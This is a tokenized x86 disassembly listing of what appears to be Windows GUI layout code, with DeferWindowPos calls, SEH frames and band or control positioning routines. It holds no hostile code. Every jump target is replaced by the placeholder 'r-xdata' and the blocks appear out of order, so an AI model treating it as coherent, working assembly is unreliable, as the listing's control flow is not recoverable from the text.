sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42f8b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_448d84
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_442470
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_441f54
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403540
test al al
je r-xdata
sub_42f8c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_414418
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44215c
mov eax ebx
mov si 0xffeb
call sub_403540
sub_42f900
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42fa78
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42f974
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f498
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_4144a4
call sub_403344
pop edi
pop esi
pop ebx
retn
sub_42f9b4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42f730
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f9ec
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4143bc
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4143bc
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42fa78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42fb41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42f974
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42f730
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb48
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4143bc
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4143bc
pop edx
call sub_442580
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42fb50
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448270
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4143bc
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42fbc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
mov esi [ ebp + 0x1c ]
mov eax 0x48
call sub_4026f4
mov [ eax ] edi
mov edx [ ebp + 0xc ]
push esi
mov esi edx
lea edi [ eax + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov dl [ ebp - 0x1 ]
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] bl
mov edx [ esi ]
mov [ eax + 0x16 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1a ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x24 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x38 ] bl
mov edx [ esi ]
mov [ eax + 0x39 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x34 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
sub_42fc44
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov edx ebx
mov eax edi
call sub_414500
mov ebx [ ebx + 0x34 ]
mov eax esi
call sub_402714
test ebx ebx
jne r-xdata
sub_42fc84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44aa4c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x64
mov eax ebx
call sub_441d0c
mov edx 0x32
mov eax ebx
call sub_441d30
mov [ ebx + 0x211 ] 0x1
mov [ ebx + 0x212 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202a4
mov esi eax
mov [ ebx + 0x22c ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_431da0
mov [ ebx + 0x230 ] 0x1a
mov [ ebx + 0x234 ] 0x1
mov dl 0x1
mov eax ebx
call sub_449b0c
mov [ ebx + 0x1f8 ] 0x1
mov dl 0x1
mov eax ebx
call sub_447960
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42fd50
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x228 ]
call sub_403344
mov eax [ ebp + 0x22c ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_44aaa8
test bl bl
jle r-xdata
inc edi
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4143bc
call sub_402714
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4143bc
test eax eax
je r-xdata
sub_42fdd8
push ebp
mov ebp esp
push ebx
push esi
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
mov ebx [ edx ]
mov esi [ eax + 0x30 ]
cmp ebx [ esi + 0x39 ]
jne r-xdata
mov eax [ eax + 0x30 ]
cmp ecx [ esi + 0x44 ]
je r-xdata
mov ebx [ edx ]
mov [ eax + 0x39 ] ebx
mov [ eax + 0x44 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ ebx - 0x4 ] eax
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_42fe14
push ebp
mov ebp esp
add esp 0xffffff50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_430945
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4309b4
mov [ ebp - 0x55 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
call sub_403b7c
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
mov [ ebp - 0x6c ] 0x2
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
mov [ ebp - 0x6d ] 0x1
dec [ ebp - 0x6c ]
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
inc [ ebp - 0x4c ]
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x48 ] 0x1
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jg r-xdata
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
mov al [ ebx + 0x15 ]
mov [ ebx + 0x38 ] al
cmp [ ebx + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x56 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
dec edx
sub edx eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffee
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x84 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x84 ]
add eax 0x4
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x84 ]
mov eax [ eax + 0x3d ]
add eax [ ebx + 0x24 ]
mov edx [ ebp - 0x88 ]
sub eax [ edx + 0xc ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x84 ]
mov ecx [ eax + 0x39 ]
mov eax [ ebp - 0x84 ]
add ecx [ eax + 0x44 ]
mov eax [ ebp - 0x88 ]
sub ecx [ eax + 0x8 ]
mov eax [ ebp - 0x88 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x84 ]
add edx [ eax + 0x3d ]
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
mov ebx [ ebp - 0x84 ]
add eax [ ebx + 0x39 ]
call sub_412f04
mov eax [ ebp - 0x84 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x98 ]
jne r-xdata
mov eax [ esi + 0x24 ]
add [ ebp - 0x8c ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x41 ] 0x0
cmp [ ebp - 0x41 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov [ ebp - 0x56 ] 0x1
lea edx [ ebp - 0x98 ]
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
call sub_441f10
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x94 ]
jne r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x1a ] eax
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x3d ] eax
jmp r-xdata
mov [ ebp - 0x41 ] 0x0
mov edx [ ebp - 0x14 ]
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x98 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x94 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x4c ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x16 ]
mov [ ebx + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ ebx + 0x1a ] edx
mov edx [ eax + 0x39 ]
mov [ ebx + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ ebx + 0x3d ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x1a ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x3d ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov eax [ eax + 0x44 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412f2c
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
sub [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebx + 0x28 ]
push eax
lea ecx [ ebx + 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0x68 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x54 ]
jge r-xdata
mov [ ebp - 0x78 ] ebx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x16 ] edx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x1a ] edx
mov eax ebx
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x39 ] edx
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp - 0xa0 ]
sub edx [ ebp - 0xa8 ]
mov [ eax + 0x44 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebx + 0x3d ]
mov [ ebp - 0x38 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_412f2c
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412f2c
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x54 ]
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0xa8 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x54 ]
call sub_4143bc
mov ebx eax
xor eax eax
mov [ ebx + 0x39 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x38 ] 0x1
inc [ ebp - 0x4c ]
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42fdd8
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x44 ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x28 ]
sub [ ebx + 0x39 ] eax
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42fdd8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov edi [ ebp - 0x14 ]
dec edi
mov eax [ ebp - 0x50 ]
sub eax edi
jg r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_412f2c
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x10 ]
sub edx [ eax + 0x4 ]
sub edx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x10 ]
sub eax [ ecx ]
sub eax [ ebx + 0x4 ]
lea ecx [ ebp - 0xb0 ]
call sub_412edc
mov eax [ ebp - 0xb0 ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0xac ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412f2c
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
dec eax
mov [ ebp - 0x7c ] eax
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
